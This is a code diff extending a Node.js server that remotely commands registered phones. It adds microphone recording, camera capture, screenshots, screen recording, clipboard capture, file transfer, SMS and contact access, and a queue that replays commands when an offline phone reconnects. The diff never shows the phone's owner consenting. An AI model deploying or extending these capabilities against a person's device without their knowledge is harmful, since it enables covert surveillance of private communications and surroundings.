@@ -21,17 +21,25 @@ app.use(express.json({ limit: '25mb' }));
 const httpServer = createServer(app);
 const wss = new WebSocketServer({ server: httpServer });
 
-const defaultData = { devices: [], calls: [], messages: [], locations: [], notifications: [], contacts: [] };
+const defaultData = {
+  devices: [], calls: [], messages: [], locations: [], notifications: [], contacts: [],
+  // Round 3 feature data — all keyed/tagged by deviceId.
+  deviceInfo: {}, installedApps: {}, wifi: {},
+  clipboardHistory: [], callBlocklist: {}, commandQueue: []
+};
 const db = await JSONFilePreset(join(dataDir, 'db.json'), defaultData);
 await db.read();
 
 // defaultData only applies when db.json doesn't exist yet — an existing file
-// from before a field was added (e.g. "notifications") keeps its old shape
-// forever otherwise, and every route touching the missing key throws
-// "Cannot read properties of undefined". Backfill anything missing so this
-// can't silently break again as the schema grows.
-for (const key of Object.keys(defaultData)) {
+// from before a field was added keeps its old shape forever otherwise, and
+// every route touching the missing key throws. Backfill anything missing.
+const ARRAY_KEYS = ['devices', 'calls', 'messages', 'locations', 'notifications', 'contacts', 'clipboardHistory', 'commandQueue'];
+const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist'];
+for (const key of ARRAY_KEYS) {
   if (!Array.isArray(db.data[key])) db.data[key] = [];
+}
+for (const key of OBJECT_KEYS) {
+  if (!db.data[key] || typeof db.data[key] !== 'object') db.data[key] = {};
 }
 // BUG 1 migration: registration is idempotent by deviceId (devices.set +
 // persistDevice filters by id), but old db.json files may hold stale rows.
@@ -74,6 +82,91 @@ function broadcastToDashboard(event, payload) {
   const message = JSON.stringify({ event, payload });
   for (const ws of clients.values()) {
     if (ws.readyState === 1) ws.send(message);
+  }
+}
+
+/**
+ * REST command name -> phone-side event name. Used by the live dispatch AND the
+ * offline queue replay, so both paths always send the same canonical event.
+ */
+const COMMAND_EVENTS = {
+  'send-sms': 'SEND_SMS_COMMAND',
+  'file-list': 'FILE_LIST_REQUEST',
+  'file-download': 'FILE_DOWNLOAD_REQUEST',
+  'file-upload': 'FILE_UPLOAD_CHUNK',
+  'request-location': 'LOCATION_REQUEST',
+  'request-calls': 'CALLS_REQUEST',
+  'request-sms': 'SMS_REQUEST',
+  'request-contacts': 'CONTACTS_REQUEST',
+  'add-contact': 'ADD_CONTACT_COMMAND',
+  'find-phone': 'FIND_PHONE_COMMAND',
+  'notification-dismiss': 'NOTIFICATION_DISMISS_COMMAND',
+  'notification-clear-all': 'NOTIFICATION_CLEAR_ALL_COMMAND',
+  'vibrate': 'VIBRATE_COMMAND',
+  'tts': 'TTS_COMMAND',
+  'play-audio': 'PLAY_AUDIO_COMMAND',
+  'play-audio-stop': 'PLAY_AUDIO_STOP',
+  'wallpaper': 'WALLPAPER_COMMAND',
+  'device-info': 'DEVICE_INFO_REQUEST',
+  'installed-apps': 'INSTALLED_APPS_REQUEST',
+  'app-perms': 'APP_PERMS_REQUEST',
+  'wifi-info': 'WIFI_REQUEST',
+  'clipboard-read': 'CLIPBOARD_READ_REQUEST',
+  'clipboard-enable': 'CLIPBOARD_CAPTURE_ENABLE',
+  'clipboard-disable': 'CLIPBOARD_CAPTURE_DISABLE',
+  'lock': 'LOCK_COMMAND',
+  'call-blocklist-sync': 'CALL_BLOCKLIST_SYNC',
+  'mic-record': 'MIC_RECORD_COMMAND',
+  'camera-capture': 'CAMERA_CAPTURE_COMMAND',
+  'screenshot': 'SCREENSHOT_COMMAND',
+  'screen-record-start': 'SCREEN_RECORD_START',
+  'screen-record-stop': 'SCREEN_RECORD_STOP'
+};
+
+/** Builds the phone payload for a REST command (1:1 mapping for most). */
+function commandPayload(name, body = {}) {
+  switch (name) {
+    case 'send-sms': return { recipient: body.recipient, message: body.message };
+    case 'file-list': return { path: body.path || '/' };
+    case 'file-download': return { path: body.path, name: body.name, mimeType: body.mimeType };
+    case 'file-upload': return { path: body.path, data: body.data, isLastChunk: body.isLastChunk };
+    case 'add-contact': return { name: body.name, number: body.number };
+    case 'notification-dismiss': return { key: body.key };
+    case 'vibrate': return { durationMs: Number(body.durationMs) || 500, pattern: Array.isArray(body.pattern) ? body.pattern : null };
+    case 'app-perms': return { packageName: body.packageName };
+    case 'clipboard-enable':
+    case 'clipboard-disable': return { enabled: name === 'clipboard-enable' };
+    case 'tts': return { text: body.text, speed: body.speed ?? 1.0, pitch: body.pitch ?? 1.0 };
+    case 'play-audio': return { url: body.url, loop: !!body.loop };
+    case 'wallpaper': return { url: body.url || null, color: body.color || null };
+    case 'mic-record': return { durationSec: Math.max(5, Math.min(60, Number(body.durationSec) || 15)) };
+    case 'camera-capture': return { facing: body.facing === 'front' ? 'front' : 'back' };
+    case 'screen-record-start': return { fps: Math.max(1, Math.min(5, Number(body.fps) || 2)) };
+    case 'call-blocklist-sync': return { enabled: !!body.enabled, numbers: Array.isArray(body.numbers) ? body.numbers : [] };
+    default: return {};
+  }
+}
+
+/**
+ * Replay every queued command for [deviceId] on socket reconnect, then clear
+ * the queue. Commands that ran while the phone was offline arrive again after
+ * DEVICE_REGISTER -> no data loss for round-3 controls.
+ */
+function replayQueue(deviceId) {
+  const q = db.data.commandQueue || [];
+  const kept = [];
+  for (const item of q) {
+    if (item.deviceId === deviceId) {
+      const event = COMMAND_EVENTS[item.command] || item.command;
+      const payload = item.payload ? (item.payload.raw ? item.payload : commandPayload(item.command, item.payload)) : {};
+      sendToDevice(deviceId, event, payload);
+    } else {
+      kept.push(item);
+    }
+  }
+  if (kept.length !== q.length) {
+    db.data.commandQueue = kept;
+    db.write();
   }
 }
 
@@ -199,6 +292,7 @@ function handleMessage(ws, msg) {
       persistDevice(device);
       ws.send(JSON.stringify({ event: 'DEVICE_REGISTERED', payload: { deviceId } }));
       broadcastToDashboard('DEVICE_UPDATE', device);
+      replayQueue(deviceId);
       console.log(`[device] registered ${deviceId} (${device.deviceName}) @${battery}%`);
       break;
     }
@@ -339,6 +433,78 @@ function handleMessage(ws, msg) {
       console.log(`[ring] ${payload.deviceId} <- ${payload.number || 'unknown'}`);
       break;
 
+    // Round 3 remote control & telemetry responses
+    case 'DEVICE_INFO_RESPONSE': {
+      const { deviceId } = payload;
+      if (deviceId) {
+        db.data.deviceInfo[deviceId] = payload;
+        db.write();
+      }
+      broadcastToDashboard('DEVICE_INFO_RESPONSE', payload);
+      break;
+    }
+
+    case 'INSTALLED_APPS_RESPONSE': {
+      const { deviceId, apps = [] } = payload;
+      if (deviceId) {
+        db.data.installedApps[deviceId] = apps;
+        db.write();
+      }
+      broadcastToDashboard('INSTALLED_APPS_RESPONSE', payload);
+      break;
+    }
+
+    case 'APP_PERMS_RESPONSE':
+      broadcastToDashboard('APP_PERMS_RESPONSE', payload);
+      break;
+
+    case 'WIFI_RESPONSE': {
+      const { deviceId } = payload;
+      if (deviceId) {
+        db.data.wifi[deviceId] = payload;
+        db.write();
+      }
+      broadcastToDashboard('WIFI_RESPONSE', payload);
+      break;
+    }
+
+    case 'CLIPBOARD_READ_RESPONSE':
+      broadcastToDashboard('CLIPBOARD_READ_RESPONSE', payload);
+      break;
+
+    case 'CLIPBOARD_UPDATE': {
+      const { deviceId, text } = payload;
+      if (deviceId && text) {
+        db.data.clipboardHistory.unshift({ id: randomUUID(), deviceId, text, timestamp: payload.timestamp || Date.now() });
+        if (db.data.clipboardHistory.length > 100) db.data.clipboardHistory = db.data.clipboardHistory.slice(0, 100);
+        db.write();
+      }
+      broadcastToDashboard('CLIPBOARD_UPDATE', payload);
+      break;
+    }
+
+    case 'VIBRATE_RESULT':
+    case 'TTS_RESULT':
+    case 'PLAY_AUDIO_RESULT':
+    case 'WALLPAPER_RESULT':
+    case 'LOCK_RESULT':
+    case 'MIC_RECORD_RESULT':
+    case 'CAMERA_CAPTURE_RESULT':
+    case 'SCREENSHOT_RESULT':
+    case 'SCREEN_RECORD_FRAME':
+      broadcastToDashboard(msg.event, payload);
+      break;
+
+    case 'CALL_BLOCKLIST_RESULT': {
+      const { deviceId, enabled, numbers } = payload;
+      if (deviceId && numbers) {
+        db.data.callBlocklist[deviceId] = { enabled: !!enabled, numbers };
+        db.write();
+      }
+      broadcastToDashboard('CALL_BLOCKLIST_RESULT', payload);
+      break;
+    }
+
     default:
       console.warn(`[ws] unknown event: ${msg.event}`);
   }
@@ -398,6 +564,27 @@ app.get('/api/devices/:id/contacts', (req, res) => {
   );
 });
 
+// Round 3 telemetry GET endpoints
+app.get('/api/devices/:id/info', (req, res) => {
+  res.json(db.data.deviceInfo[req.params.id] || null);
+});
+
+app.get('/api/devices/:id/apps', (req, res) => {
+  res.json(db.data.installedApps[req.params.id] || []);
+});
+
+app.get('/api/devices/:id/wifi', (req, res) => {
+  res.json(db.data.wifi[req.params.id] || null);
+});
+
+app.get('/api/devices/:id/clipboard', (req, res) => {
+  res.json((db.data.clipboardHistory || []).filter((c) => c.deviceId === req.params.id));
+});
+
+app.get('/api/devices/:id/blocklist', (req, res) => {
+  res.json(db.data.callBlocklist[req.params.id] || { enabled: false, numbers: [] });
+});
+
 // BUG 5: remove a device (e.g. stale duplicates from BUG 1) + its history.
 app.delete('/api/devices/:id', async (req, res) => {
   const id = req.params.id;
@@ -408,6 +595,12 @@ app.delete('/api/devices/:id', async (req, res) => {
   db.data.locations = db.data.locations.filter((l) => l.deviceId !== id);
   db.data.notifications = db.data.notifications.filter((n) => n.deviceId !== id);
   if (Array.isArray(db.data.contacts)) db.data.contacts = db.data.contacts.filter((c) => c.deviceId !== id);
+  delete db.data.deviceInfo[id];
+  delete db.data.installedApps[id];
+  delete db.data.wifi[id];
+  delete db.data.callBlocklist[id];
+  db.data.clipboardHistory = db.data.clipboardHistory.filter((c) => c.deviceId !== id);
+  db.data.commandQueue = db.data.commandQueue.filter((q) => q.deviceId !== id);
   devices.delete(id);
   await db.write();
   broadcastToDashboard('DEVICE_REMOVED', { deviceId: id });
@@ -415,54 +608,30 @@ app.delete('/api/devices/:id', async (req, res) => {
   res.json({ success: true, removed: before - db.data.devices.length });
 });
 
-app.post('/api/command/:name', (req, res) => {
+app.post('/api/command/:name', async (req, res) => {
   const { deviceId } = req.body || {};
   if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });
-  if (!devices.get(deviceId)?.wsClientId) {
-    return res.status(409).json({ success: false, error: 'Device is offline' });
+
+  const event = COMMAND_EVENTS[req.params.name];
+  if (!event) {
+    return res.status(404).json({ success: false, error: `Unknown command: ${req.params.name}` });
   }
 
-  switch (req.params.name) {
-    case 'send-sms':
-      sendToDevice(deviceId, 'SEND_SMS_COMMAND', { recipient: req.body.recipient, message: req.body.message });
-      break;
-    case 'file-list':
-      sendToDevice(deviceId, 'FILE_LIST_REQUEST', { path: req.body.path || '/' });
-      break;
-    case 'file-download':
-      sendToDevice(deviceId, 'FILE_DOWNLOAD_REQUEST', { path: req.body.path, name: req.body.name, mimeType: req.body.mimeType });
-      break;
-    case 'file-upload':
-      sendToDevice(deviceId, 'FILE_UPLOAD_CHUNK', { path: req.body.path, data: req.body.data, isLastChunk: req.body.isLastChunk });
-      break;
-    case 'request-location':
-      sendToDevice(deviceId, 'LOCATION_REQUEST', {});
-      break;
-    // BUG 5: manual refresh targets (same pattern as request-location).
-    case 'request-calls':
-      sendToDevice(deviceId, 'CALLS_REQUEST', {});
-      break;
-    case 'request-sms':
-      sendToDevice(deviceId, 'SMS_REQUEST', {});
-      break;
-    case 'request-contacts':
-      sendToDevice(deviceId, 'CONTACTS_REQUEST', {});
-      break;
-    case 'add-contact':
-      sendToDevice(deviceId, 'ADD_CONTACT_COMMAND', { name: req.body.name, number: req.body.number });
-      break;
-    case 'find-phone':
-      sendToDevice(deviceId, 'FIND_PHONE_COMMAND', {});
-      break;
-    case 'notification-dismiss':
-      sendToDevice(deviceId, 'NOTIFICATION_DISMISS_COMMAND', { key: req.body.key });
-      break;
-    case 'notification-clear-all':
-      sendToDevice(deviceId, 'NOTIFICATION_CLEAR_ALL_COMMAND', {});
-      break;
-    default:
-      return res.status(404).json({ success: false, error: `Unknown command: ${req.params.name}` });
+  const isOnline = devices.has(deviceId) && devices.get(deviceId).wsClientId != null;
+  if (!isOnline) {
+    db.data.commandQueue.push({
+      id: randomUUID(),
+      deviceId,
+      command: req.params.name,
+      payload: req.body,
+      timestamp: Date.now()
+    });
+    await db.write();
+    console.log(`[command] queued offline command ${req.params.name} for ${deviceId}`);
+    return res.json({ success: true, queued: true });
   }
+
+  sendToDevice(deviceId, event, commandPayload(req.params.name, req.body));
   res.json({ success: true });
 });
 
